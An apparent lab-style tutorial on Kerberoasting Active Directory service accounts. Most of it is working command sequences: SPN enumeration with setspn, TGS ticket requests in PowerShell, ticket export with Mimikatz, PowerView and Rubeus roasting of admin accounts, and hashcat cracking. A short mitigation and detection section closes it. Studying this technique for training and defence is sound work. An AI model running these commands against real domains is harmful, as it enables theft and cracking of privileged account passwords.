Kerberoasting is a technique used to extract and crack Kerberos Ticket Granting Service (TGS) tickets to gain access to privileged accounts. While modern tools such as **Rubeus** automate the process, the traditional semi-manual method involves using built-in Windows tools and PowerShell.

## **Enumerating SPNs with** `**setspn.exe**`

The `setspn.exe` tool can be used to identify Service Principal Names (SPNs) linked to user accounts.

```powershell
setspn.exe -Q */*
```

Example Output
```powershell
CN=sqlprod,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/SPSJDB.inlanefreight.local:1433
CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
```

**Key Takeaways:**
- Focus on user accounts and ignore computer accounts.
- Identify high-value targets (e.g., SQL servers, backup jobs).
---
## **Requesting TGS Tickets via PowerShell**

After identifying an SPN, request a **TGS ticket** for it.

 **Command:**
```powershell
Add-Type -AssemblyName System.IdentityModel

New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

 **Explanation:**
- `**Add-Type -AssemblyName System.IdentityModel**` → Adds the necessary .NET framework class.
- `**New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken**` → Requests a TGS ticket for the SPN.
- This method mimics what tools like **Rubeus** do under the hood.
---
##  **Retrieving All Tickets Using PowerShell**

To extract tickets for **all SPNs**, use:

```powershell
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```
This retrieves TGS tickets for all accounts with an SPN.

---
## **Extracting Tickets from Memory with Mimikatz**

Once tickets are loaded into memory, extract them using **Mimikatz**.

```powershell
mimikatz.exe
mimikatz # base64 /out:true
mimikatz # kerberos::list /export
```
 
 **Explanation:**
- `kerberos::list /export` → Dumps TGS tickets to disk.
- If not using `base64 /out:true`, `.kirbi` files are created.
- **Next Step:** Convert these to Hashcat format for cracking.

 **Preparing the Base64 Blob for Cracking**
 Extracted ticket must be formatted properly.

```bash
echo "<base64 blob>" | tr -d '\n' > encoded_file
cat encoded_file | base64 -d > sqldev.kirbi
kirbi2john sqldev.kirbi > crack_file
```
- Converts `.kirbi` files to **Hashcat-compatible format**.
- Uses `kirbi2john.py` to extract the **TGS hash**.

**Cracking the Ticket with Hashcat**
After extracting the **hash**, use **Hashcat** to brute-force it.

```bash
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
```
- **Mode 13100** → RC4-encrypted Kerberos TGS hashes.
- **Output:** Cracked plaintext password.

---
## **Automated Methods: Using PowerView**

PowerView from PowerSploit can streamline Kerberoasting.

 **Enumerating SPNs with PowerView**
```powershell
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname
```

 **Extracting TGS Hash in Hashcat Format**
```powershell
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```

 **Exporting All Tickets to CSV**
```powershell
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

---

## **Using Rubeus for Kerberoasting**
Rubeus provides a faster alternative.

**Basic Usage:**
```powershell
Rubeus.exe kerberoast /nowrap
```

 **Advanced Usage:**
 ```powershell
Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```
- `admincount=1` → Targets **high-value accounts**.
- `/nowrap` → Formats output for easy Hashcat cracking.

 **Cracking AES-encrypted Tickets**
- AES-256 tickets use **Hashcat mode 19700**.
```powershell
hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt
```
---
## **Defensive Mitigation & Detection**

### **Mitigation Strategies:**

- **Use Managed Service Accounts (MSA/gMSA)** → Auto-rotating strong passwords.
- **Set long, complex passwords** for service accounts.
- **Restrict RC4 encryption** for Kerberos tickets.

### **Detection Strategies:**

- **Monitor Windows Event ID 4769** (Abnormal TGS requests).
- **Audit Kerberos Service Ticket Operations** in Group Policy.
- **Analyze for spikes in Kerberos TGS requests.**